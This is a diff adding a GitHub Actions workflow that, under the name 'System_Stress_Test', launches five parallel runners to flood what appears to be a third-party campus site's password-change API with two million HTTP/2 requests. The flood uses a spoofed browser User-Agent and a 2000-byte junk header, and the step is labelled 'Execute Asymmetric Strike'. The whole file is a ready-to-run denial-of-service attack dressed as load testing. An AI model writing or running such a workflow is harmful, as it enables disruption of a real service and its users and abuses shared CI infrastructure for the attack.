@@ -1,0 +1,20 @@
+name: System_Stress_Test
+on: [workflow_dispatch] # Allows you to trigger it manually with one click
+
+jobs:
+  stress_test:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        node: [1, 2, 3, 4, 5] # This launches 5 parallel runners
+    steps:
+      - name: Install Tools
+        run: sudo apt-get update && sudo apt-get install -y nghttp2-client
+
+      - name: Execute Asymmetric Strike
+        run: |
+          # The Header-Bloated Hammer
+          h2load -n 2000000 -c 1000 -m 100 -t 8 \
+          -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/115.0.0.0" \
+          -H "X-Garbage: $(python3 -c 'print("A"*2000)')" \
+          https://fmobile.rpscampus.in/api/changepassword
